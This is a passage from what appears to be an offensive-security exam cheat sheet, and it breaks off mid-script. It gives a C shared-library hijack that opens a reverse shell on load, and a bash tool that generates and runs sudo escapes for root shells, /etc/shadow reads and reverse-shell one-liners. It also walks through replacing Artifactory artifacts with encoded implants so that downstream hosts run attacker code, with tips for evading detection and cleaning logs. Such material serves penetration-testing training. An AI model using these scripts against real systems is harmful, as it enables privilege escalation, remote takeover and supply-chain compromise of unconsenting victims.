 *   nm -D --defined-only /usr/lib/x86_64-linux-gnu/libmissing.so.1.1   # copy real export table
 *   nm -D --undefined-only /usr/local/bin/target                        # symbols the host actually needs
 *   Stub whatever is missing: copy the geteuid template below; name/args/return type must match the
 *   real library or the host reports "symbol lookup error" / crashes.
 * Placeholders: LHOST=attacker IP, LPORT=listener port (baked into DEFAULT_CMD, or override with
 *       PAYLOAD_CMD env)
 * Test status: Compiles with gcc -Wall -fPIC -c locally; not exercised on a Linux target.
 *
 * Difference from the LD_PRELOAD version (m13-shared-library-ldpreload.c):
 *   - PRELOAD line: any name works; runs on load; no need to export symbols.
 *   - LIBRARY_PATH line: must be same name + must fill host-used exports, or link/run fails.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/wait.h>

#ifndef DEFAULT_CMD
#define DEFAULT_CMD "/bin/sh -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"
#endif

static int g_fired = 0;

static void fire_payload(void)
{
    if (g_fired) return;
    g_fired = 1;

    const char *cmd = getenv("PAYLOAD_CMD");
    if (!cmd || !*cmd) cmd = DEFAULT_CMD;

    pid_t pid = fork();
    if (pid < 0) return;
    if (pid == 0) {
        pid_t grand = fork();
        if (grand == 0) {
            setsid();
            execl("/bin/sh", "sh", "-c", cmd, (char *)NULL);
            _exit(127);
        }
        _exit(0);
    }
    int st = 0;
    waitpid(pid, &st, 0);
}

__attribute__((constructor))
static void m13_ldlibrarypath_init(void)
{
    fire_payload();
}

/* Resolve the "next" real symbol: RTLD_NEXT means look in libraries after this one (usually libc/the real lib) */
static void *resolve_real(const char *name)
{
    void *sym = dlsym(RTLD_NEXT, name);
    if (!sym) fprintf(stderr, "[m13] forward resolve failed %s: %s\n", name, dlerror());
    return sym;
}

/* Export template 1: geteuid — used in both LD_PRELOAD / LD_LIBRARY_PATH cheat-sheet sections.
 * Fire payload on first call, then forward to real geteuid unchanged. */
uid_t geteuid(void)
{
    static uid_t (*real_geteuid)(void) = NULL;
    static int resolved = 0;

    if (!resolved) {
        union { void *sym; uid_t (*fn)(void); } u;
        u.sym = resolve_real("geteuid");
        real_geteuid = u.fn;
        resolved = 1;
    }

    fire_payload();

    if (real_geteuid) return real_geteuid();
    return getuid();
}

/* Export template 2: getpid — shows "any signature can follow this pattern".
 * Usage: swap function name, parameter list, and return type for a real export from the target
 * library (e.g. libcrypto's
 * int EVP_EncryptUpdate(EVP_CIPHER_CTX *, unsigned char *, int *, const unsigned char *, int)). */
pid_t getpid(void)
{
    static pid_t (*real_getpid)(void) = NULL;
    static int resolved = 0;

    if (!resolved) {
        union { void *sym; pid_t (*fn)(void); } u;
        u.sym = resolve_real("getpid");
        real_getpid = u.fn;
        resolved = 1;
    }

    fire_payload();

    if (real_getpid) return real_getpid();
    return (pid_t)0;
}
````

## Scenario 39 · sudo allows only one editor or interpreter

### Situation
`sudo -l` shows the current user is allowed only one program (e.g. `/usr/bin/vim`, `/usr/bin/find`, `/usr/bin/lua`, often `NOPASSWD`) and it runs as root. No other local priv-esc path. Goal: **escape a shell from that trusted program itself** (GTFOBins idea), and handle sudoers argument restrictions.

### Assumptions
- `sudo -l` confirms the allow entry: e.g. `(root) NOPASSWD: /usr/bin/vim` or `(ALL) /usr/bin/find *`.
- sudoers may restrict argument patterns (e.g. `vim /home/user/*`, `find /var/log`) or may not.
- You can interactively run the command (have a TTY or can trigger via webshell/script).

### Prepare (attacker)
1. Enumerate first: `sudo -l`, `sudo -ll` (argument patterns), `id`.
2. Confirm the allowlisted program’s GTFOBins escape (vim/find/lua shell escapes below).
3. Local listener `nc -lvnp LPORT` (if reverse) or prepare interactive commands to collect output.

### Procedure
1. `sudo -l` to confirm the entry and NOPASSWD status.
2. Escape per allowlisted program (pick one; the script auto-matches):
   - **vim**: `sudo vim -c ':!/bin/sh'` (interactive); or `sudo vim -c ':set shell=/bin/sh' -c ':shell'`; non-interactive: `sudo vim -c ':!/bin/sh -c "id > /tmp/out; cat /tmp/out"'`.
   - **find**: `sudo find . -exec /bin/sh \; -quit` (or `-exec /bin/sh -p \;`); if args are restricted see failure branches.
   - **lua**: `sudo lua -e 'os.execute("/bin/sh")'`; or `sudo lua -e 'os.execute("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")'` for a direct reverse.
3. Confirm root shell: `id` (uid=0).
4. Continue lateral / grab flag as needed; keep commands short and avoid history.

### Lab files
- `m13-sudo-gtfobins.sh`: parse `sudo -l` allow entries, print/run matching vim/find/lua escapes; includes read/exfil modes when arguments are restricted.

### Verify
- `sudo -l` entry exists and either prompts no password (NOPASSWD) or you know `PASS`.
- Escape returns a root shell: `id` shows `uid=0(root)`.
- Under restrictions you can still read target files (`/etc/shadow`, flag) or establish a reverse.

### Failure branches / fallbacks
1. **sudoers restricts arguments** (e.g. `vim /home/user/*`): argv is limited but vim internal commands are not — enter with `sudo vim /home/user/x` then `:e /etc/shadow`, `:r /etc/shadow`, `:!/bin/sh` (if allowed) to read; if find path is limited, try `sudo find /home/user -exec ...` only if `-exec` is in the pattern; otherwise switch to a “read-type” escape.
2. **Escape explicitly banned in sudoers** (e.g. `!*sh*`): try other escapes in the same program (vim `:terminal`/`:python3` if built with support; if find `-exec sh` is banned try `-exec bash`/`-exec awk`); otherwise fall back to “read file + exfil” instead of a shell.
3. **No TTY** (web exec): use non-interactive variants that write results to a readable file, or one-liner reverse `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` via `-c '...'`.
4. **Program version lacks that escape**: check current GTFOBins entry and switch (e.g. vim also has `:!bash`, same for `view`); keep multiple alternatives in the script.
5. **sudo needs a password you do not know**: this scenario assumes NOPASSWD or known `PASS`; if neither, this is not the entry — fall back to other modules (credential collection / service weaknesses).

### Exam OPSEC
- Read the full `sudo -l` entry and comments first — do not assume “sudo can run anything”; only hit the allowlisted entry; out-of-policy commands get logged.
- In the root shell disable/clean history: `unset HISTFILE`.
- Do not spam failed sudo commands on a shared sudoers host; get it right once.

---

#### `m13-sudo-gtfobins.sh` {#m13-sudo-gtfobins-sh}

````bash
#!/usr/bin/env bash
# Purpose: Escape-command templates when sudo only allows a specific program (vim/find/lua/less/awk/perl/…):
#       parse sudo -l allow entries → match known escapable programs → emit commands in shell / read /
#       reverse modes, and optionally run them in an interactive terminal (GTFOBins idea, including
#       "read-type" escapes when sudoers restricts arguments).
# Scenario: 39 (sudo allows only one editor or interpreter)
# Depends: run on the target Linux; needs sudo and the target program present; reverse mode needs an
#       attacker listener (nc -lvnp LPORT)
# Usage:
#   bash m13-sudo-gtfobins.sh -l                          # parse sudo -l; list escapable allowlisted programs
#   bash m13-sudo-gtfobins.sh -p vim                      # print vim shell escape
#   bash m13-sudo-gtfobins.sh -p find -m read -f /etc/shadow      # read high-priv file without a TTY
#   bash m13-sudo-gtfobins.sh -p lua  -m reverse --lhost LHOST --lport LPORT
#   bash m13-sudo-gtfobins.sh -r vim                      # run vim escape directly (needs interactive TTY)
#   bash m13-sudo-gtfobins.sh -A                          # print template list for all supported programs
# Placeholders: LHOST=attacker IP; LPORT=listener port (substituted in reverse mode; left literal if unset)
# Test status: bash -n syntax OK; not exercised on a Linux target
set -uo pipefail

SELF="$(basename "$0")"
SUPPORTED="vim vi view nvim nano ed find lua lua5.1 awk gawk perl python python3 ruby php node less more man git env nice timeout stdbuf tar zip nmap ftp gdb socat make"

MODE="shell"
PROG=""
ACTION="print"
RD_FILE="/etc/shadow"
OUT="/tmp/m13-sudo-gtfobins.out"
LHOST="LHOST"
LPORT="LPORT"

usage() {
  cat <<EOF
Usage: $SELF [options]

  -l, --list                parse sudo -l; list escapable programs in allow entries (default action)
  -p, --program <name>      print escape command for that program ($SUPPORTED )
  -r, --run <name>          run that program's escape (needs interactive TTY)
  -m, --mode <mode>         shell (default, interactive shell) | read (read high-priv file) | reverse (callback)
  -f, --file <path>         file to read in read mode (default ${RD_FILE})
  -o, --out <path>          output file for read mode (default ${OUT})
      --lhost <LHOST>        attacker IP for reverse mode (placeholder LHOST)
      --lport <LPORT>        listener port for reverse mode (placeholder LPORT)
  -A, --all                 print templates for all supported programs
  -h, --help                show this help

Examples:
  $SELF -l
  $SELF -p vim -m shell
  $SELF -p awk -m read -f /root/flag.txt
  $SELF -p python3 -m reverse --lhost LHOST --lport LPORT
  $SELF -r find
EOF
}

die() { printf '[!] %s\n' "$*" >&2; exit 2; }
info() { printf '[*] %s\n' "$*"; }
hit() { printf '[+] %s\n' "$*"; }

# Build escape command for program + mode; unknown combo returns non-zero
escape_cmd() {
  local p="$1" m="$2"
  case "$p" in
    vim|vi|view|nvim)
      case "$m" in
        shell)   printf "sudo %s -c ':!/bin/sh'" "$p" ;;
        read)    printf "sudo %s -es -u NONE -c ':%%print' -c ':q!' %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -c ':!/bin/bash -c \"bash -i >& /dev/tcp/%s/%s 0>&1\"'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    nano)
      case "$m" in
        shell)   printf "sudo %s -s /bin/sh;  # after enter: Ctrl+R read file / Ctrl+X exit" "$p" ;;
        read)    printf "sudo %s -B -v %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s; # ^R read file then ^T exec: bash -i >& /dev/tcp/%s/%s 0>&1" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    ed)
      case "$m" in
        shell)   printf "sudo %s; !/bin/sh" "$p" ;;
        read)    printf "sudo %s -s %s;  # then type ,p to print all, q to quit" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s; !/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    find)
      case "$m" in
        shell)   printf "sudo find . -exec /bin/sh \\\; -quit" ;;
        read)    printf "sudo find %s -exec head -c 4096 {} \\\;" "$RD_FILE" ;;
        reverse) printf "sudo find . -exec /bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' \\\; -quit" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    lua|lua5.1)
      case "$m" in
        shell)   printf "sudo %s -e 'os.execute(\"/bin/sh\")'" "$p" ;;
        read)    printf "sudo %s -e 'local f=io.open(\"%s\");print(f:read(\"*a\"));f:close()'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -e 'os.execute(\"bash -i >& /dev/tcp/%s/%s 0>&1\")'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    awk|gawk)
      case "$m" in
        shell)   printf "sudo %s 'BEGIN {system(\"/bin/sh\")}'" "$p" ;;
        read)    printf "sudo %s '{print \\$0}' %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s 'BEGIN {system(\"bash -i >& /dev/tcp/%s/%s 0>&1\")}'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    perl)
      case "$m" in
        shell)   printf "sudo %s -e 'exec \"/bin/sh\";'" "$p" ;;
        read)    printf "sudo %s -ne 'print' %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -e 'exec \"bash\", \"-i\", \"&>\", \"/dev/tcp/%s/%s\";'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    python|python3)
      case "$m" in
        shell)   printf "sudo %s -c 'import pty;pty.spawn(\"/bin/sh\")'" "$p" ;;
        read)    printf "sudo %s -c 'print(open(\"%s\").read())'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -c 'import socket,os,pty;s=socket.create_connection((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    ruby)
      case "$m" in
        shell)   printf "sudo %s -e 'exec \"/bin/sh\"'" "$p" ;;
        read)    printf "sudo %s -e 'puts File.read(\"%s\")'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -rsocket -e 'exit if fork;c=TCPSocket.new(\"%s\",\"%s\");loop{c.gets;IO.popen(c,\"r+\"){|p|p.gets}}'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    php)
      case "$m" in
        shell)   printf "sudo %s -r 'system(\"/bin/sh\");'" "$p" ;;
        read)    printf "sudo %s -r 'echo file_get_contents(\"%s\");'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -r '\$s=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    node)
      case "$m" in
        shell)   printf "sudo %s -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]});'" "$p" ;;
        read)    printf "sudo %s -e 'console.log(require(\"fs\").readFileSync(\"%s\",\"utf8\"))'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -e 'const n=require(\"net\"),c=new n.Socket();c.connect(%s,\"%s\",()=>c.pipe(process.stdin));'" "$p" "$LPORT" "$LHOST" ;;
        *) return 1 ;;
      esac ;;
    less|more)
      case "$m" in
        shell)   printf "sudo %s %s;  # after open type !/bin/sh" "$p" "$RD_FILE" ;;
        read)    printf "sudo %s %s;  # non-TTY: content echoes directly; on TTY press q to quit" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s %s;  # after open type !bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$RD_FILE" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    man)
      case "$m" in
        shell)   printf "sudo %s man;  # after open type !/bin/sh" "$p" ;;
        read)    printf "sudo %s -P \"head -c 4096 %s\" man" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s man;  # after open type !bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    git)
      case "$m" in
        shell)   printf "sudo %s help status;  # after open type !/bin/sh" "$p" ;;
        read)    printf "sudo %s -c core.pager=\"head -c 4096 %s\" -p help" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s help status;  # after open type !bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    env|nice|timeout|stdbuf)
      case "$m" in
        shell)   printf "sudo %s /bin/sh" "$p" ;;
        read)    printf "sudo %s head -c 4096 %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    tar|zip)
      case "$m" in
        shell)   printf "sudo %s -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" "$p" ;;
        read)    printf "sudo %s -cf /dev/null %s --checkpoint=1 --checkpoint-action=exec=sh\\\\ -c\\\\ head\\\\ -c\\\\ 4096\\\\ %s" "$p" "$RD_FILE" "$RD_FILE" ;;
        reverse) printf "sudo %s -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=sh\\\\ -c\\\\ bash\\\\ -i\\\\ >&\\\\ /dev/tcp/%s/%s\\\\ 0>&1" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    nmap)
      case "$m" in
        shell)   printf "echo \"os.execute('/bin/sh')\" > /tmp/m13.nse && sudo %s --script=/tmp/m13.nse" "$p" ;;
        read)    printf "echo \"os.execute('head -c 4096 %s')\" > /tmp/m13.nse && sudo %s --script=/tmp/m13.nse" "$RD_FILE" "$p" ;;
        reverse) printf "echo \"os.execute('bash -i >& /dev/tcp/%s/%s 0>&1')\" > /tmp/m13.nse && sudo %s --script=/tmp/m13.nse" "$LHOST" "$LPORT" "$p" ;;
        *) return 1 ;;
      esac ;;
    ftp)
      case "$m" in
        shell)   printf "sudo %s;  # then type !/bin/sh" "$p" ;;
        read)    printf "sudo %s;  # then type ! head -c 4096 %s" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s;  # then type ! bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    gdb)
      case "$m" in
        shell)   printf "sudo %s -q -nx -ex '!sh' -ex quit" "$p" ;;
        read)    printf "sudo %s -q -nx -ex '!head -c 4096 %s' -ex quit" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -q -nx -ex '!bash -i >& /dev/tcp/%s/%s 0>&1' -ex quit" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    socat)
      case "$m" in
        shell)   printf "sudo %s exec:'bash -li',pty,stderr,setsid,sigint,sane" "$p" ;;
        read)    printf "sudo %s -U FILE:%s,rdonly STDOUT" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    make)
      case "$m" in
        shell)   printf "sudo %s -s --eval=\\$'x:\\\\\\n\\\\\\t-/bin/sh'" "$p" ;;
        read)    printf "sudo %s -s --eval=\\$'x:\\\\\\n\\\\\\t-head -c 4096 %s'" "$p" "$RD_FILE" ;;
        reverse) printf "sudo %s -s --eval=\\$'x:\\\\\\n\\\\\\t-bash -i >& /dev/tcp/%s/%s 0>&1'" "$p" "$LHOST" "$LPORT" ;;
        *) return 1 ;;
      esac ;;
    *)
      return 1 ;;
  esac
}

print_templates() {
  local p="$1" cmd
  printf '\n=== %s ===\n' "$p"
  for m in shell read reverse; do
    if cmd="$(escape_cmd "$p" "$m")"; then
      printf '  [%s]\n    %s\n' "$m" "$cmd"
    else
      printf '  [%s] no template available\n' "$m"
    fi
  done
}

do_list() {
  info "parse sudo -l (read allow entries and arg limits; only hit the allowlisted entry)"
  if ! command -v sudo >/dev/null 2>&1; then
    die "no sudo in this environment; cannot enumerate allow entries"
  fi
  sudo -l 2>&1 | sed 's/^/    /'
  printf '\n'
  hit "escapable programs in allow entries:"
  local found=0 p sudo_out
  sudo_out="$(sudo -l 2>/dev/null)"
  for p in $SUPPORTED; do
    if printf '%s' "$sudo_out" | grep -Eq "(^|[[:space:]]|/)${p}([[:space:]]|,|$)"; then
      printf '    [+] %s -> %s\n' "$p" "$(escape_cmd "$p" "$MODE")"
      found=1
    fi
  done
  if [ "$found" -eq 0 ]; then
    info "no known escapable program matched in sudo -l: check for arg limits, or use -A for full templates to compare by hand"
  fi
  printf '\n'
  info "hint: when sudoers limits args, shell mode is often blocked — switch to -m read for a read-type escape (file content echoes directly)"
}

do_all() {
  local p
  printf '=== all escape templates (MODE=%s) ===\n' "$MODE"
  for p in $SUPPORTED; do
    if cmd="$(escape_cmd "$p" "$MODE")"; then
      printf '  %-10s %s\n' "$p" "$cmd"
    fi
  done
}

do_print() {
  local p="$1" cmd
  if ! cmd="$(escape_cmd "$p" "$MODE")"; then
    die "unsupported program: ${p} (supported: ${SUPPORTED})"
  fi
  printf '\n=== %s / %s mode ===\n' "$p" "$MODE"
  printf '%s\n' "$cmd"
  case "$MODE" in
    read)    info "no TTY: capture output with: $cmd > $OUT 2>&1" ;;
    reverse) info "start attacker listener first: nc -lvnp ${LPORT} (replace --lhost/--lport first)" ;;
    shell)   info "needs interactive TTY; without TTY use -m read or -m reverse" ;;
  esac
  printf '\n'
}

do_run() {
  local p="$1" cmd
  if ! cmd="$(escape_cmd "$p" "$MODE")"; then
    die "unsupported program: ${p} (supported: ${SUPPORTED})"
  fi
  info "exec: $cmd"
  if [ "$MODE" = "read" ]; then
    info "also writing output to $OUT"
    bash -c "$cmd" 2>&1 | tee "$OUT"
  else
    bash -c "$cmd"
  fi
}

# ---- argument parsing ----
while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)   usage; exit 0 ;;
    -l|--list)   ACTION="list"; shift ;;
    -A|--all)    ACTION="all"; shift ;;
    -p|--program) [ $# -ge 2 ] || die "-p needs an argument: program name"; PROG="$2"; ACTION="print"; shift 2 ;;
    -r|--run)    [ $# -ge 2 ] || die "-r needs an argument: program name"; PROG="$2"; ACTION="run"; shift 2 ;;
    -m|--mode)   [ $# -ge 2 ] || die "-m needs an argument: shell|read|reverse"; MODE="$2"; shift 2 ;;
    -f|--file)   [ $# -ge 2 ] || die "-f needs an argument: file path"; RD_FILE="$2"; shift 2 ;;
    -o|--out)    [ $# -ge 2 ] || die "-o needs an argument: output path"; OUT="$2"; shift 2 ;;
    --lhost)     [ $# -ge 2 ] || die "--lhost needs an argument"; LHOST="$2"; shift 2 ;;
    --lport)     [ $# -ge 2 ] || die "--lport needs an argument"; LPORT="$2"; shift 2 ;;
    *)           usage; die "unknown option: $1" ;;
  esac
done

case "$MODE" in
  shell|read|reverse) ;;
  *) usage; die "invalid -m mode: ${MODE} (shell|read|reverse)" ;;
esac

case "$ACTION" in
  list)  do_list ;;
  all)   do_all ;;
  print) [ -n "$PROG" ] || { usage; die "use -p to specify a program name"; }; do_print "$PROG" ;;
  run)   [ -n "$PROG" ] || { usage; die "use -r to specify a program name"; }; do_run "$PROG" ;;
  *)     usage; die "specify an action with -l / -p / -r / -A" ;;
esac
````

## Scenario 40 · You can overwrite the artifact, but cannot log into the consumer hosts

### Situation
The lab has an artifact repository / distribution service (aligned with the cheat-sheet **Artifactory (JFrog)** class of scenarios): you gained write access to artifact storage (you can **overwrite/replace** an artifact that downstream machines download and run), but **cannot SSH/log into those consumer hosts**. Goal: make the consumer run your code (callback/implant) on the next pull/exec, while keeping the artifact “looking normal” (same filename, arch, business behavior) to avoid detection.

### Assumptions
- You already have a writable point on the repo side (Artifactory admin/upload API, creds in a backup store, or filesystem write), and can locate the artifact’s real path in storage.
- You know or can observe which artifact the consumer downloads, how it uses it (run binary? unpack jar? run script?), and the trigger cadence/method.
- Outbound callback conditions match earlier scenarios; `LHOST:LPORT` is reachable from the consumer.

### Prepare (attacker)
1. Confirm Artifactory process and layout (common path `/opt/jfrog/artifactory/`):
   - `ps aux | grep artifactory`
   - Backup/cred clues: `/opt/jfrog/artifactory/var/backup/access` (encrypted creds/DB backups), or data dir `.../var/data/access/derby` (copy out offline if needed — see cheat sheet).
2. Locate the target artifact file: search filestore by name/checksum (Artifactory usually has a binary store + metadata); confirm **arch and format** (`file`, `readelf -h`: x86_64 consumer cannot run an arm artifact).
3. Build the replacement:
   - Preserve original business behavior (if the scenario requires the consumer to keep working), and layer your code; or wrap as “callback first, then original logic”.
   - Optionally use `m13-xor-encoder.py` + `m13-simple-loader.c` for an in-memory load shape so the landed “artifact” has no plaintext payload.
4. Start a listener on the attacker box.

### Procedure
1. Find the target file in artifact storage; **backup the original** first (`.bak`, same dir or copy back to attacker for restore/compare).
2. Use `m13-artifactory-replace.sh` for the swap: backup → drop replacement → (if needed) restore owner/mode/metadata → record original checksum.
3. Trigger/wait for consumer pull: restart/refresh consumer jobs, or wait for the repo’s pull interval.
4. Confirm callback on the listener; inside the session confirm identity/environment and collect target info.
5. Cleanup: restore the original artifact as needed (script supports `--restore`); tear down listener and temp files.

### Lab files
- `m13-artifactory-replace.sh`: locate, backup, replace, fix permissions, checksum verify, restore.
- (Helper) `m13-xor-encoder.py` / `m13-simple-loader.c`: build the replacement as “shell + in-memory payload”.

### Verify
- After replace, `file`/`readelf`/`sha256sum` match expectations (same arch; business output matches original when required).
- Listener gets a callback after the consumer’s next pull.
- Repo side shows no errors (consumer can still parse the artifact; format was not broken).

### Failure branches / fallbacks
1. **Cannot find the exact file in storage (metadata split from blobs)**: download via Artifactory’s download API and match checksums; or use backup-store creds to log into the admin API and do a “legitimate upload” overwrite of the same version/path.
2. **Consumer verifies artifact signature/checksum**: if you cannot bypass, switch to “replace a dependency / secondary file” or “point repo config at another artifact path you control” instead of hard-swapping the main file.
3. **Arch mismatch → consumer cannot run**: rebuild for the consumer’s arch (`-m64`/`-m32`/arm); `file` the original first.
4. **Consumer only pulls on a specific trigger (short exam window)**: do whatever active trigger is allowed (kick a build/deploy task, or force one pull from a service the consumer reaches), and ensure the replacement is valid on the first pull.
5. **Replacement breaks business and ops notices**: prefer wrap mode (run original logic first); keep the restore script ready; restore and clean logs after verify.

### Exam OPSEC
- Always backup before replace; record the original checksum and compare on restore.
- Do not delete other repo files or disturb the backup store into a broad alert — keep the change surface small.
- Inside the session, avoid dropping plaintext tools on the consumer; keep using encode + in-memory load.
- Restore the original artifact before leaving so later scenarios that depend on the same repo are not broken.

---

#### `m13-artifactory-replace.sh` {#m13-artifactory-replace-sh}

````bash
#!/usr/bin/env bash
# Purpose: Artifact-repo (Artifactory / generic binary repo) replace pipeline —
#       download original → backup and record checksum → build same-arch (elf32/elf64 auto)
#       same-name replacement → checksum → upload overwrite → re-pull and compare → one-shot restore;
#       when downstream hosts pull on schedule and execute, they get your code (scenario 40).
# Scenario: 40 (you can overwrite the artifact, but cannot log into the consumer hosts)
# Depends: curl (download/upload), gcc (build replacement), readelf or file (arch detect),
#       python3 + m13-xor-encoder.py (encode payload and embed into the replacement)
# Usage:
#   bash m13-artifactory-replace.sh info    http://TARGET:8082/artifactory/repo/pkg.bin
#   bash m13-artifactory-replace.sh pull    http://TARGET:8082/artifactory/repo/pkg.bin
#   bash m13-artifactory-replace.sh build   ./pkg.bin -p ./stage2.bin -k 0xfa
#   bash m13-artifactory-replace.sh push    http://TARGET:8082/artifactory/repo/pkg.bin ./m13-artifactory-work/pkg.bin --user USER --pass PASS
#   bash m13-artifactory-replace.sh verify  http://TARGET:8082/artifactory/repo/pkg.bin ./m13-artifactory-work/pkg.bin
#   bash m13-artifactory-replace.sh restore http://TARGET:8082/artifactory/repo/pkg.bin ./m13-artifactory-work/pkg.bin.bak
#   bash m13-artifactory-replace.sh -h
# Placeholders: URL=artifact URL; USER/PASS=repo creds; PAYLOAD=local payload file; LHOST/LPORT only inside the payload
# Test status: bash -n syntax OK; not exercised against a real artifact repo
set -uo pipefail

SELF="$(basename "$0")"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOADER_SRC="$SCRIPT_DIR/../c/m13-simple-loader.c"
ENCODER_SRC="$SCRIPT_DIR/../python/m13-xor-encoder.py"

WORK="./m13-artifactory-work"
KEY="0xfa"
PAYLOAD=""
ARCH="auto"
OUT=""
AUSER=""
APASS=""
CMD=""
URL_ARG=""
FILE_ARG=""

usage() {
  cat <<EOF
Usage: $SELF <command> [args] [options]

Commands:
  info    <URL|local file>   show artifact type, arch (elf32/elf64), machine, checksum
  pull    <URL>              download original into work dir; auto-backup as <file>.bak and record checksum
  build   <local original>   build same-arch + same-name replacement (default: embed payload, single-file drop)
  push    <URL> <local file> upload overwrite of remote artifact
  verify  <URL> <local file> re-download remote and compare sha256 to local
  restore <URL> <local bak>  upload .bak original back to restore the field

Options:
  -p, --payload <file>  payload to embed (XOR-encoded into the replacement; omit to build "read sibling .enc" variant)
  -k, --key <0xNN>      XOR key (default ${KEY}; must match payload side)
  -a, --arch <auto|32|64>  replacement arch; default auto-detect from original
  -w, --work <dir>      work directory (default ${WORK})
  -o, --out <file>      output filename for pull/build
      --user <USER>     repo account (placeholder USER)
      --pass <PASS>     repo password or API key (placeholder PASS)
  -h, --help            show this help

Examples:
  $SELF pull http://TARGET:8082/artifactory/generic-local/agent.bin
  $SELF build ./agent.bin -p ./stage2.bin -k 0xfa
  $SELF push http://TARGET:8082/artifactory/generic-local/agent.bin ./m13-artifactory-work/agent.bin --user USER --pass PASS
EOF
}

die() { printf '[!] %s\n' "$*" >&2; exit 2; }
info() { printf '[*] %s\n' "$*"; }
hit() { printf '[+] %s\n' "$*"; }
need() { command -v "$1" >/dev/null 2>&1 || die "missing command: $1 (install it or use a host that has it)"; }

sha_of() {
  if command -v sha256sum >/dev/null 2>&1; then sha256sum "$1" | awk '{print $1}';
  elif command -v shasum >/dev/null 2>&1; then shasum -a 256 "$1" | awk '{print $1}';
  else die "missing sha256sum/shasum; cannot compute checksum"; fi
}

# Detect ELF bitness: print 32 / 64 / empty (non-ELF)
elf_class() {
  local f="$1"
  if command -v readelf >/dev/null 2>&1; then
    readelf -h "$f" 2>/dev/null | awk -F: '/Class:/{ v=$2; gsub(/[^A-Za-z0-9]/,"",v); if (v ~ /ELF32/) print 32; else if (v ~ /ELF64/) print 64; }'
  elif command -v file >/dev/null 2>&1; then
    if file -L "$f" 2>/dev/null | grep -q 'ELF 32-bit'; then echo 32;
    elif file -L "$f" 2>/dev/null | grep -q 'ELF 64-bit'; then echo 64; fi
  else
    info "neither readelf nor file present; skipping arch detect"
  fi
}

curl_auth() {
  if [ -n "$AUSER" ]; then printf -- '--user\n%s\n' "$AUSER:$APASS"; fi
}

do_info() {
  local f="$1"
  [ -n "$f" ] || die "info needs <URL|local file>"
  if [ -f "$f" ]; then
    local tmp="$f"
  else
    need curl
    tmp="$(mktemp)"
    curl -sS $(curl_auth) -o "$tmp" "$f" || die "download failed: $f"
  fi
  hit "artifact: $f"
  printf '  size: %s bytes\n' "$(wc -c <"$tmp" | tr -d ' ')"
  printf '  sha256: %s\n' "$(sha_of "$tmp")"
  if command -v file >/dev/null 2>&1; then printf '  type: %s\n' "$(file -Lb "$tmp")"; fi
  if command -v readelf >/dev/null 2>&1; then
    readelf -h "$tmp" 2>/dev/null | grep -E 'Class:|Machine:|Type:' | sed 's/^/  /' || true
  fi
  local cls
  cls="$(elf_class "$tmp")"
  if [ -n "$cls" ]; then hit "arch detect: elf${cls} (replacement must match or downstream exec fails)"; fi
  [ "$tmp" = "$f" ] || rm -f "$tmp"
}

do_pull() {
